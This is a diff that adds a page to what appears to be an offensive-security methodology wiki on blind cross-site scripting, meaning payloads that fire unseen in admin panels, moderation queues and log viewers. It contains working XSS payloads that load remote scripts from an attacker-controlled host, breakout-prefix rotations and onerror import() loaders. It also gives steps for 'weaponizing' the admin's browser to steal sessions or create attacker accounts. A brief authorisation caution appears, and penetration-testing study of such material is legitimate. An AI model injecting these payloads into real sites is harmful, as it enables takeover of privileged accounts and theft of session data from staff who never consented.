@@ -1,0 +1,135 @@
+---
+title: Blind XSS
+description: XSS that executes somewhere you can't see - an admin panel, a moderation queue, a log viewer - detected with out-of-band callbacks that identify the vulnerable field and context.
+mitre: [T1059.007, T1185]
+d3fend: [D3-AH]
+impact: [CredentialTheft, AdminCompromise]
+owasp: [A03]
+noise: moderate
+sidebar:
+  order: 9
+  label: Blind
+---
+import { Aside, Steps } from '@astrojs/starlight/components';
+
+Blind XSS is stored XSS whose render happens on a page you have no access to - a staff-only admin panel, a moderation queue, a log or analytics viewer, an emailed notification. You submit the payload, see nothing, and only find out it worked when it fires in someone else's browser. Because that someone is usually privileged, blind XSS is one of the most direct routes to an admin session - but you can only confirm it out-of-band.
+
+## TL;DR
+
+```
+# Payload loads a remote script named after the field it went into,
+# so the callback tells you WHICH field fired and WHERE.
+<script src=//<ATTACKER>/username></script>   → into the username field
+<script src=//<ATTACKER>/ticket_body></script> → into the ticket body
+# A hit on /username means the username field executed in the admin's browser.
+```
+
+Success indicator: an inbound request to your server/collaborator that you did not make - it came from the victim's browser rendering your payload, out of your view.
+
+## Where blind XSS lives
+
+Any input that is reviewed later by someone else, through an interface you don't control:
+
+- Support tickets, contact forms, abuse/bug reports
+- Product reviews and comments held for moderation
+- User-detail fields shown in an admin user-management panel
+- Log and analytics dashboards that render `User-Agent`, `Referer`, or request paths
+- Anything that generates a staff email or PDF/report from your input
+
+The `User-Agent` and `Referer` headers are classic blind sinks: they land in admin-facing log viewers that render them as HTML.
+
+## The core problem: no feedback
+
+You can't see the render, which creates two unknowns:
+
+1. **Which field is vulnerable?** You may be injecting into many fields; any one of them could be the one that fires.
+2. **Which payload works?** You can't watch the context, so you can't tell why a given payload failed.
+
+Both are solved by making execution phone home, and by encoding the field identity into the callback.
+
+## Step 1 - Stand up an out-of-band listener
+
+You need something that records inbound HTTP (and ideally DNS) hits:
+
+- **Burp Collaborator** or **Interactsh** (`interactsh-client`) - unique callback hostnames, capture HTTP + DNS, no setup beyond the client.
+- **XSS Hunter Express** - purpose-built for blind XSS: its payloads auto-collect the page URL, DOM, cookies, and a screenshot of wherever they fired, which immediately tells you what the admin page looks like.
+- A plain `php -S 0.0.0.0:80` or `python -m http.server` on a box you control, when you just need to see the hit.
+
+<Aside type="caution">
+Use infrastructure you are authorised to use and that fits the engagement's data-handling rules. XSS Hunter-style beacons can exfiltrate DOM, cookies, and screenshots of an internal admin panel - make sure that is in scope and that third-party/self-hosted collection is agreed before you point a client's staff browser at it.
+</Aside>
+
+## Step 2 - Identify the field with per-field callbacks
+
+Name the callback after the field, so the inbound request tells you which input executed:
+
+```
+# Put a differently-named loader in each field
+<script src=//<ATTACKER>/fullname></script>
+<script src=//<ATTACKER>/username></script>
+<script src=//<ATTACKER>/subject></script>
+```
+
+A request for `/username` means the username field executed. This is the key trick: it collapses "something fired" into "this specific field fired."
+
+<Steps>
+
+1. Submit one named loader per candidate field (skip fields with strict format validation like email, and secrets like passwords that aren't echoed).
+2. Wait - the render happens when a human opens the admin view, which can be minutes or hours.
+3. When a callback arrives, note the path (which field) and move to a real payload in that field.
+
+</Steps>
+
+## Step 3 - Work around the unknown context
+
+You can't see the markup, so you can't tailor the breakout. Two strategies:
+
+- **Rotate breakout prefixes** across submissions, each still loading the same named remote script, so different contexts are covered:
+
+  ```
+  <script src=//<ATTACKER>/f1></script>
+  "><script src=//<ATTACKER>/f2></script>
+  '><script src=//<ATTACKER>/f3></script>
+  <img src=x onerror="import('//<ATTACKER>/f4.js')">
+  ```
+
+  The callback path (`f1`…`f4`) tells you which breakout succeeded as well as which field.
+- **Prefer a remote script over an inline payload.** Keep the injected value tiny and put all logic in the hosted script, so you can change what the payload *does* without re-injecting. Blind XSS succeeds most often where you can guess the context least - so lean on the loader and iterate server-side.
+
+<Aside type="note">
+Blind XSS pairs naturally with [DOM-based](../dom-based/) sinks in admin SPAs: if the admin panel renders your value through `innerHTML`, a `<script src>` won't run but an `<img src=x onerror=import('//<ATTACKER>/x.js')>` loader will. Include a handler-based loader in your rotation.
+</Aside>
+
+## Step 4 - Weaponize for the privileged session
+
+Once a field+breakout fires, the payload runs in the reviewer's browser. The useful actions target their privileges:
+
+- Exfiltrate the admin session or DOM - the receiver and `document.cookie` / callback patterns are in [XSS to session](/codex/web/sessions/xss-to-session/).
+- If cookies are `HttpOnly`, drive the admin's own session: call the app's admin API from their browser to create an attacker account or change a role - see [XSS+CSRF chain](/codex/web/sessions/xss-csrf-chain/).
+- With XSS Hunter-style beacons, the auto-captured screenshot and DOM tell you what admin functionality is reachable before you commit to an action.
+
+## Common failure modes
+
+- **No callback ever.** The field may be format-validated, never rendered, or rendered with correct output encoding. Confirm the loader itself isn't malformed, and try the handler-based (`onerror`) loader for `innerHTML` sinks.
+- **Callback for the script but no follow-up exfil.** The loader ran but the hosted script errored (CSP, syntax, blocked fetch). Check the admin page's CSP via what the beacon captured; adapt per [Filter bypasses](/codex/web/xss/filter-bypasses/#csp-bypass).
+- **Long delay misread as failure.** Human-triggered renders are slow. Give it time before rotating.
+- **Only DNS fires, not HTTP.** The context executed enough to resolve a name but a connect/CSP blocked HTTP - useful confirmation; adjust the payload to a permitted scheme/host.
+
+## Quick reference
+
+| Step | Action |
+|---|---|
+| Listener | Collaborator / Interactsh / XSS Hunter / own server |
+| Identify | One loader per field, named after the field |
+| Context | Rotate breakout prefixes; encode which one in the path |
+| Delivery | Remote-script loader, logic hosted (not inline) |
+| Weaponize | Admin session theft / app-API abuse from their browser |
+
+## Next move
+
+- **Named callback received** → you know the field; switch that field to a real remote-script payload
+- **Script loads but nothing exfiltrates** → likely CSP on the admin page; see [CSP bypass](/codex/web/xss/filter-bypasses/#csp-bypass)
+- **Admin panel uses `innerHTML`** → handler-based loader (`<img src=x onerror=import('//<ATTACKER>/x.js')>`); see [DOM-based](../dom-based/)
+- **Got the admin session/DOM** → exfil and reuse via [XSS to session](/codex/web/sessions/xss-to-session/)
+- **`HttpOnly` cookies** → act as the admin in-browser via [XSS+CSRF chain](/codex/web/sessions/xss-csrf-chain/)
+- **Putting it all together** → [Skill assessment chain](../skill-assessment-chain/)
